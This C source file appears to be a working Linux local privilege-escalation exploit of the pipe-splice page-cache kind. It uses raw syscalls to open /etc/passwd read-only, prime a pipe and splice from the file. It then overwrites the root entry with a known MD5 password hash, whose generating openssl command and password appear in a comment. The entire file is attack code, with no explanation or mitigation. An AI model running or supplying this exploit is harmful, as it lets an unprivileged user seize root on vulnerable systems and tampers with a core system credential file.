#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int main() {
	const char *const path = "/etc/passwd";
	loff_t offset = 4;
    // openssl passwd -1 -salt root euvel
	const char *const data = ":$1$root$dknzSNSH.oe1NxQp/34pz.:0:0:test:/root:/bin/sh\n";
	const size_t data_size = 59;
	const int fd = syscall(257, -100, path, 0);
	int p[2];
	syscall(22, p);
	const unsigned pipe_size = syscall(72, p[1], 1032);
	static char buffer[PAGE_SIZE];
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > PAGE_SIZE ? PAGE_SIZE : r;
		syscall(1, p[1], buffer, n);
		r -= n;
	}
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > PAGE_SIZE ? PAGE_SIZE : r;
		syscall(0, p[0], buffer, n);
		r -= n;
	}
	--offset;
	syscall(275, fd, &offset, p[1], NULL, 1, 0);
	syscall(1, p[1], data, data_size);
	syscall(231, 0);
}